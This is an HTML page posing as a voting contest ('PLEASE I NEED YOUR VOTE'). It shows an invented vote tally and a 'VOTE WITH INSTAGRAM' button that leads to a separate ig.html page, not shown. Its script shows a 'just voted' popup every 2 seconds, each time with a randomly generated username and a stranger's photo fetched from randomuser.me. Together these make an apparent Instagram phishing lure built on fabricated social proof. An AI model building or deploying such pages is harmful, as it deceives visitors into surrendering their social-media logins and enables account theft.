<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title></title>
  <!-- Link Preview Meta Tags -->
  <meta property="og:title" content="">
  <meta property="og:description" content="">
  <meta property="og:image" content="1a3c3945-1665-435e-b0f1-9785ab5c6cf5.jpeg"> <!-- Replace with your image URL -->
  <meta property="og:url" content="https://jewelbrabd.netlify.app"> <!-- Replace with your actual URL -->
  <meta name="twitter:card" content="summary_large_image">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }

    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #f2f2f2;
    }

    .container {
      background-color: white;
      width: 400px;
      padding: 20px;
      border-radius: 10px;
      text-align: center;
      border: 1px solid #e0e0e0;
    }

    h2 {
      font-size: 18px;
      color: #333;
      margin-bottom: 20px;
    }
    .logo-section {
      margin-bottom: 20px;
      text-align: center;
    }

    .logo {
      width: 100%;
      max-width: 250px;
      height: auto;
      object-fit: contain;
      margin-bottom: 10px;
    }

    .logo-section h3 {
      font-size: 24px;
      font-weight: bold;
      color: #333;
    }

    .logo-section p {
      font-size: 12px;
      color: #666;
    }

    .vote-info {
      border: 2px solid #4a90e2;
      border-radius: 5px;
      padding: 15px;
      margin: 20px 0;
    }

    .vote-info h4 {
      font-size: 18px;
      color: #333;
      margin-bottom: 10px;
    }

    .progress-bar {
      width: 100%;
      text-align: center;
      margin: 10px 0;
    }

    .progress-text {
      font-size: 14px;
      color: #333;
      margin-bottom: 5px;
      display: block;
    }

    .progress {
      width: 100%;
      background-color: #e0e0e0;
      border-radius: 10px;
      height: 10px;
      overflow: hidden;
    }

    .progress-fill {
      height: 100%;
      background-color: #4a90e2;
      border-radius: 10px 0 0 10px;
    }

    .total-to-win {
      font-size: 16px;
      color: #333;
      margin: 10px 0;
    }

    .instagram-btn {
      width: 100%;
      padding: 10px 20px;
      border-radius: 5px;
      font-size: 14px;
      color: white;
      font-weight: bold;
      border: none;
      background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); /* Instagram gradient */
      cursor: pointer;
      text-decoration: none;
      display: inline-block;
      text-align: center;
    }

    /* Popup styling */
    .popup {
      display: flex;
      align-items: center;
      gap: 10px;
      padding: 10px;
      background-color: #ffffff;
      border-radius: 5px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
      position: fixed;
      bottom: 20px;
      left: 20px;
      opacity: 0;
      visibility: hidden;
      transition: opacity 0.3s ease, visibility 0.3s ease;
    }

    .popup img {
      width: 40px;
      height: 40px;
      border-radius: 50%;
    }

    .popup.show {
      opacity: 1;
      visibility: visible;
    }

    .popup p {
      font-size: 14px;
      color: #333;
    }
  </style>
</head>
<body>

  <div class="container">
    <h2>PLEASE I NEED YOUR VOTE</h2>
    <div class="logo-section">
      <img src="1a3c3945-1665-435e-b0f1-9785ab5c6cf5.jpeg" alt="Clothing Logo" class="logo">
    </div>
    <div class="vote-info">
      <h4>Ryan Coby</h4>
      <div class="progress-bar">
        <span class="progress-text">Total Votes: 5500 out of 5688</span>
        <div class="progress">
          <div class="progress-fill" style="width: 96.7%;"></div>
        </div>
      </div>
      <p class="total-to-win">✔️ Total Votes To Win: 188</p>
    </div>
    <a href="ig.html" class="instagram-btn">VOTE WITH INSTAGRAM</a>
  </div>

  <!-- Popup element -->
  <div class="popup" id="popup">
    <img src="" alt="User profile picture" id="popup-img">
    <p><span id="popup-username"></span> just voted!</p>
  </div>

  <script>
    function generateRandomUsername() {
      const adjectives = ["cool", "amazing", "swift", "happy", "mystic", "brave"];
      const names = ["aarya", "veer", "anjali", "ritika", "devansh", "mansi", "rohit", "simran"];
      const randomAdjective = adjectives[Math.floor(Math.random() * adjectives.length)];
      const randomName = names[Math.floor(Math.random() * names.length)];
      const randomNumber = Math.floor(Math.random() * 1000);
      return `${randomAdjective}_${randomName}_${randomNumber}`;
    }

    async function showPopup() {
      const popup = document.getElementById('popup');
      const username = document.getElementById('popup-username');
      const profileImg = document.getElementById('popup-img');
      
      // Randomize username
      username.textContent = generateRandomUsername();

      // Fetch a random profile picture from Random User API
      try {
        const response = await fetch('https://randomuser.me/api/');
        const data = await response.json();
        profileImg.src = data.results[0].picture.thumbnail; // Get thumbnail image from API
      } catch (error) {
        console.error('Failed to fetch random user image:', error);
      }

      // Show popup
      popup.classList.add('show');

      // Hide popup after 3 seconds
      setTimeout(() => {
        popup.classList.remove('show');
      }, 3000);
    }

    // Show popup every 2 seconds
    setInterval(showPopup, 2000);
  </script>

</body>
</html>
